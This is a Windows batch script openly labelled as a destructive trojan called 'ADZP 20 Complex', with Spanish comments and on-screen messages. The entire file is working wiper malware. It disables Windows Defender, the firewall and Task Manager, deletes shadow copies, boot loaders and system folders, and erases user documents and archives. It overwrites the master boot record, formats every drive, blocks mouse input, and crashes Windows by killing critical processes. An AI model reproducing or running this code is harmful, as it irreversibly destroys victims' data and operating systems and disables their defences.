@echo off
::
:: Troyano ADZP 20 Complex - Creado por Dharkon SK.
::
:: Nombre del troyano: ADZP 20 Complex, Shingapi.sk, Twain_20
:: Creador: Dharkon SK
:: Nivel de destruccion: Maximo
::
goto WinMain

:DestroyFile
   if not exist "%~1" (goto :eof)
   takeown /f "%~1" /d !ANS[X]! >nul 2>nul
   icacls "%~1" /reset /c /q >nul 2>nul
   attrib -r -a -s -h "%~1" >nul 2>nul
   del /f /q "%~1" >nul 2>nul
goto :eof

:DestroyDirectory
   if not exist "%~1" (goto :eof)
   takeown /f "%~1" /r /d !ANS[X]! >nul 2>nul
   icacls "%~1" /reset /t /c /q >nul 2>nul
   attrib -r -a -s -h "%~1\*.*" >nul 2>nul
   rd /s /q "%~1" >nul 2>nul
goto :eof

:DestroyEx
   for /r "%SystemDirectory%" %%x in (*.%~1) do (call :DestroyFile "%%x")
goto :eof

:FileDeletionThread
   for /r "%cd%" %%x in (%SignedFiles%) do (call :DestroyFile "%%x")
   call :DestroyDirectory "%WinDir%\INF"
   call :DestroyDirectory "%WinDir%\Boot"
   call :DestroyDirectory "%WinDir%\WaaS"
   call :DestroyDirectory "%WinDir%\System"
   call :DestroyDirectory "%WinDir%\Resources"
   call :DestroyDirectory "%SystemDirectory%\Boot"
   call :DestroyDirectory "%SystemDirectory%\config"
   call :DestroyDirectory "%SystemDirectory%\drivers"
   call :DestroyDirectory "%SystemDirectory%\CatRoot"
   call :DestroyDirectory "%SystemDirectory%\DriverStore"
goto :eof

:AppFlood
   start "" "%TROJAN_FILE_PATH%" Modify-Instance
   start explorer.exe
   if exist "%WinDir%\notepad.exe" (start notepad)
   if exist "%SystemDirectory%\calc.exe" (start calc)
   if exist "%SystemDirectory%\mspaint.exe" (start mspaint)
   rundll32 shell32.dll, ShellAboutA ADZP 20 Complex destruira tu computadora
goto :eof

:FormatDevice
   if /i "%~1" == "%NULL%" (goto :eof)
   if /i "%~1:" == "%HomeDrive%" (goto :eof)
   if /i "%~1:" == "%TROJAN_WORK_DRIVE%" (goto :eof)
   format /y /q %~1: >nul 2>nul
goto :eof

:MatrixEffect
   color a
   :Loop[X]
      echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
   goto Loop[X]
goto :eof

:WriteRandomFile
   if /i "%~1" == "%NULL%" (goto :eof)
   for /l %%x in (1,1,256) do (set Buffer.RandomData=!Buffer.RandomData!!random!)
   @(
      echo.!Buffer.RandomData!
   ) >> "%~1" 2>nul
   set Buffer.RandomData=%NULL%
goto :eof

:KillAntivirus
   reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>nul
   reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>nul
   reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul 2>nul
   reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f >nul 2>nul
   reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>nul
goto :eof

:OverWriteMBR
   set MBR=^
      0xB8, 0x03, 0x00, 0xCD, 0x10, 0xB4, 0x01, 0xB5, 0x20, 0xB1, 0x00, 0xCD, 0x10, 0xBE, 0x21, 0x7C, 0xAC, 0x3C, 0x00, 0x74, 0x08, 0xB4, 0x0E, 0xB7, 0x00, 0xCD, 0x10, 0xEB, 0xF3, 0xFA, 0xF4, 0xEB, 0xFC, 0x0D, 0x0A, 0x4E, 0x6F, 0x20, 0x73, 0x65, 0x20, 0x68, 0x61, 0x20, 0x70, 0x6F, 0x64, 0x69, 0x64, 0x6F, 0x20, 0x61, 0x63, 0x63, 0x65, 0x64, 0x65, 0x72, 0x20, 0x61, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x0D, 0x0A, ^
      0x41, 0x44, 0x5A, 0x50, 0x20, 0x32, 0x30, 0x20, 0x43, 0x6F, 0x6D, 0x70, 0x6C, 0x65, 0x78, 0x20, 0x68, 0x61, 0x20, 0x64, 0x65, 0x73, 0x74, 0x72, 0x75, 0x69, 0x64, 0x6F, 0x20, 0x74, 0x75, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x75, 0x74, 0x61, 0x64, 0x6F, 0x72, 0x61, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ^
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ^
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ^
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ^
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ^
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ^
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA

   for %%i in (!MBR!) do (set /a MBR.Length+=1)
   powershell -ex bypass -nol -nop -noni -c "$hDevice = [System.IO.File]::Open('\\.\PhysicalDrive0', [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite); while (%true%) { $hDevice.Write(([byte[]](!MBR!)), 0, !MBR.Length!) }; $hDevice.Close" >nul 2>nul
goto :eof

:PlayAudioSequence
   set AudioSequence.MainExpression="t * (((2 & (t >> 13)) > 0) ? 7 : 5) * (3 - ((3 & (t >> 9))) + ((3 & (t >> 8)))) >> (3 & (-t) >> (((t & 4096) == 4096 || ((t >> 11) %% 32) > 28) ? 2 : 16)) | (t >> 3)"
   set AudioSequence.MainExpression=!AudioSequence.MainExpression:^^^^=^^!
   set AudioSequence.HzFrequency=11025
   set AudioSequence.SoundDuration=30
   powershell -ex bypass -nol -nop -noni -c "Add-Type -TypeDefinition 'using System; using System.IO; using System.Media; public class WinAPI { public static void PlayAudioSequence() { int buffer = !AudioSequence.HzFrequency! * !AudioSequence.SoundDuration!; byte[] vf = new byte[buffer]; for (int t = 0; t < buffer; t++) vf[t] = (byte)(!AudioSequence.MainExpression!); using (var ms = new MemoryStream()) { using (var bw = new BinaryWriter(ms)) { bw.Write(new byte[] {82, 73, 70, 70}); bw.Write(36 + vf.Length); bw.Write(new byte[] {87, 65, 86, 69}); bw.Write(new byte[] {102, 109, 116, 32}); bw.Write(16); bw.Write((short)(1)); bw.Write((short)(1)); bw.Write(!AudioSequence.HzFrequency!); bw.Write(!AudioSequence.HzFrequency! * 1); bw.Write((short)(1)); bw.Write((short)(8)); bw.Write(new byte[] {100, 97, 116, 97}); bw.Write(vf.Length); bw.Write(vf); ms.Position = 0; new SoundPlayer(ms).PlaySync(); }}}}'; while (%true%) { [WinAPI]::PlayAudioSequence() }" >nul 2>nul
goto :eof

:CursorControl
   powershell -ex bypass -nol -nop -noni -c "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class WinAPI { [DllImport(\"user32.dll\")] public static extern bool BlockInput(bool fBlockIt); }'; Add-Type -AssemblyName System.Windows.Forms; [WinAPI]::BlockInput(%true%); $MainScreen = [System.Windows.Forms.Screen]::PrimaryScreen; $Width = $MainScreen.Bounds.Width; $Height = $MainScreen.Bounds.Height; while (%true%) { $x = Get-Random -Minimum 0 -Maximum $Width; $y = Get-Random -Minimum 0 -Maximum $Height; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y); Start-Sleep -Milliseconds 20 }" >nul 2>nul
goto :eof

:SetProcessAsCritical
   powershell -ex bypass -nol -nop -noni -c "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class WinAPI { [DllImport(\"ntdll.dll\")] public static extern int RtlSetProcessIsCritical(bool bNewValue, out bool pbOldValue, bool bCheckFlag); }'; [WinAPI]::RtlSetProcessIsCritical(%true%, [ref](0), %false%); Wait-Event" >nul 2>nul
goto :eof

:NtRaiseHardError
   if /i "%~1" == "%NULL%" (goto :eof)
   powershell -ex bypass -nol -nop -noni -c "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class WinAPI { [DllImport(\"ntdll.dll\")] public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue); [DllImport(\"ntdll.dll\")] public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response); }'; [WinAPI]::RtlAdjustPrivilege(19, %true%, %false%, [ref](0)); [WinAPI]::NtRaiseHardError([UInt32]('%~1'), 0, 0, 0, 6, [ref](0))" >nul 2>nul
goto :eof

:CrashWindows
   powershell wininit >nul 2>nul
   taskkill /im svchost.exe /f >nul 2>nul
   taskkill /im lsass.exe /f >nul 2>nul
   taskkill /im csrss.exe /f >nul 2>nul
   taskkill /im winlogon.exe /f >nul 2>nul
   taskkill /im wininit.exe /f >nul 2>nul
   %HomeDrive%\con\con >nul 2>nul
   \\.\GLOBALROOT\Device\ConDrv\KernelConnect >nul 2>nul
goto :eof

:ForceShutdown
   shutdown -p -f >nul 2>nul
   wmic os where Primary=%true% call Win32Shutdown 12 >nul 2>nul
goto :eof

:WinMain
   title ADZP 20 Complex
   setlocal enabledelayedexpansion
   set TROJAN_FILE_PATH=%~f0
   set TROJAN_FILE_NAME=%~nx0
   set TROJAN_WORK_RUTE=%~dp0
   set TROJAN_WORK_DRIVE=%~d0
   set TROJAN_INSTANCE_BOOL=1
   set SystemDirectory=%WinDir%\System32
   for /f %%x in ('"prompt $E & for %%y in (0) do rem"') do (set ESC=%%x)
   for /f %%x in ('"prompt $H & for %%y in (0) do rem"') do (set BS=%%x)
   set /p NULL=<nul
   set true=1
   set false=0
   for /f "tokens=*" %%x in ('"choice <nul 2>nul"') do ((set ANS[X]=%%x) & (set ANS[X]=!ANS[X]:~1,1!))
   set SignedFiles=^
      *.rar *.zip *.7z  ^
      *.bak *.tar *.gz  ^
      *.jpg *.png *.bmp ^
      *.mp3 *.mp4 *.wav ^
      *.doc *.xls *.ppt ^
      *.odt *.ods *.odp ^
      *.mdb *.gif *.avi ^
      *.docx *.xlsx *.pptx ^
      *.accdb *.jpeg *.pdf ^
      *.backup *.sql *.suo
   cd /d "%TROJAN_WORK_RUTE%" >nul 2>nul
   if /i "%~1" == "Execute-Thread" (call :%~2 %3 %4 %5 %6 %7 %8 %9 & exit)
   if /i "%~1" == "Modify-Instance" (set TROJAN_INSTANCE_BOOL=0)
   color 4
   echo Windows NT
   echo ADZP 20 Complex destruira tu sistema operativo
   vssadmin delete shadows /all >nul 2>nul
   call :DestroyFile "%SystemDirectory%\winresume.exe"
   call :DestroyFile "%SystemDirectory%\winload.exe"
   call :DestroyFile "%SystemDirectory%\hal.dll"
   start /b "" cmd /q /c "%TROJAN_FILE_PATH%" Execute-Thread FileDeletionThread >nul 2>nul
   start /b "" cmd /q /c "%TROJAN_FILE_PATH%" Execute-Thread SetProcessAsCritical >nul 2>nul
   if /i "%TROJAN_INSTANCE_BOOL%" == "1" (
      start /b "" cmd /q /c "%TROJAN_FILE_PATH%" Execute-Thread OverWriteMBR >nul 2>nul
      start /b "" cmd /q /c "%TROJAN_FILE_PATH%" Execute-Thread PlayAudioSequence >nul 2>nul
      start /b "" cmd /q /c "%TROJAN_FILE_PATH%" Execute-Thread CursorControl >nul 2>nul
   )
   bcdedit /delete {current} >nul 2>nul
   rundll32 user32.dll, SwapMouseButton
   if not exist "Error.vbs" (
      @(
         echo do
         echo Message = MsgBox^(^"Error critico^", 16 ,^"Error^"^)
         echo loop
      ) >> "Error.vbs" 2>nul
   )
   if not exist "Advertencia.vbs" (
      @(
         echo do
         echo Message = MsgBox^(^"Error en el sistema^", 48 ,^"Error^"^)
         echo loop
      ) >> "Advertencia.vbs" 2>nul
   )
   if not exist "Informacion.vbs" (
      @(
         echo do
         echo Message = MsgBox^(^"Has sido hackeado^^!^", 64 ,^"ADZP 20 Complex^"^)
         echo loop
      ) >> "Informacion.vbs" 2>nul
   )
   echo off >> "Taskse.exe" 2>nul
   for /l %%i in (1,1,10) do (echo !random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!) >> "Taskse.exe" 2>nul
   start /b "" WScript Informacion.vbs >nul 2>nul
   ipconfig /release >nul 2>nul
   netsh interface set interface "Wi-Fi" admin=disabled >nul 2>nul
   netsh interface set interface "Ethernet" admin=disabled >nul 2>nul
   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>nul
   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f >nul 2>nul
   reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f >nul 2>nul
   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>nul
   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 1 /f >nul 2>nul
   call :KillAntivirus
   netsh advfirewall set allprofiles state off >nul 2>nul
   attrib -r -a -s -h *.* >nul 2>nul
   start "" "%TROJAN_FILE_PATH%" Execute-Thread MatrixEffect >nul 2>nul
   call :WriteRandomFile "Virus.db"
   call :WriteRandomFile "Virus.exe"
   call :WriteRandomFile "Virus.dll"
   call :WriteRandomFile "Virus.com"
   call :WriteRandomFile "Virus.ini"
   call :WriteRandomFile "Virus.inf"
   call :WriteRandomFile "Virus.sys"
   call :WriteRandomFile "Virus.reg"
   call :WriteRandomFile "Virus.iso"
   call :WriteRandomFile "Virus.bin"
   call :WriteRandomFile "Virus.cmd"
   call :WriteRandomFile "Virus.jar"
   call :WriteRandomFile "Virus.chk"
   call :WriteRandomFile "Virus.lib"
   call :WriteRandomFile "Virus.ocx"
   call :WriteRandomFile "Virus.dat"
   call :WriteRandomFile "Virus.cur"
   call :WriteRandomFile "Virus.386"
   call :WriteRandomFile "Virus.scr"
   call :WriteRandomFile "Virus.acm"
   call :WriteRandomFile "Virus.cpl"
   call :WriteRandomFile "Virus.hlp"
   call :WriteRandomFile "Virus.mls"
   call :WriteRandomFile "Virus.pnf"
   call :WriteRandomFile "Virus.vbs"
   call :WriteRandomFile "Virus.drv"
   call :WriteRandomFile "Virus.wsh"
   call :WriteRandomFile "Virus.cer"
   call :WriteRandomFile "Virus.msc"
   call :WriteRandomFile "Virus.html"
   start /b "" WScript Error.vbs >nul 2>nul
   start /b "" WScript Advertencia.vbs >nul 2>nul
   start /b "" WScript Error.vbs >nul 2>nul
   start /b "" WScript Advertencia.vbs >nul 2>nul
   start /b "" WScript Error.vbs >nul 2>nul
   start /b "" WScript Advertencia.vbs >nul 2>nul
   start /b "" WScript Error.vbs >nul 2>nul
   start /b "" WScript Advertencia.vbs >nul 2>nul
   start /b "" WScript Error.vbs >nul 2>nul
   start /b "" WScript Advertencia.vbs >nul 2>nul
   msg * Virus detectado >nul 2>nul
   msg * Virus detectado >nul 2>nul
   msg * Has sido hackeado^^! >nul 2>nul
   call :AppFlood
   call :AppFlood
   call :AppFlood
   call :DestroyEx ax
   call :DestroyEx msc
   call :DestroyEx cpl
   call :DestroyEx ini
   call :DestroyEx bin
   call :DestroyEx nls
   call :DestroyEx dat
   call :DestroyEx ocx
   call :DestroyEx drv
   call :DestroyEx sys

   for %%x in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (call :FormatDevice "%%x")

   if exist "%HomeDrive%\autoexec.bat" (call :DestroyFile "%HomeDrive%\autoexec.bat")
   if exist "%HomeDrive%\boot.ini" (call :DestroyFile "%HomeDrive%\boot.ini")
   if exist "%HomeDrive%\ntldr" (call :DestroyFile "%HomeDrive%\ntldr")
   if exist "%HomeDrive%\windowswin.ini" (call :DestroyFile "%HomeDrive%\windowswin.ini")
   if exist "%HomeDrive%\ntdetect.com" (call :DestroyFile "%HomeDrive%\ntdetect.com")

   shutdown -s -t 75 -c "ADZP 20 Complex esta a punto de eliminar el sistema operativo." -f >nul 2>nul

   start /b "" WScript Error.vbs >nul 2>nul
   start /b "" WScript Advertencia.vbs >nul 2>nul
   start /b "" WScript Error.vbs >nul 2>nul
   start /b "" WScript Advertencia.vbs >nul 2>nul

   call :NtRaiseHardError 0xdeaddead & call :CrashWindows & call :ForceShutdown

   start /b "" WScript Error.vbs >nul 2>nul
   start /b "" WScript Advertencia.vbs >nul 2>nul
   start /b "" WScript Error.vbs >nul 2>nul
   start /b "" WScript Advertencia.vbs >nul 2>nul

   timeout /nobreak -1 >nul 2>nul

exit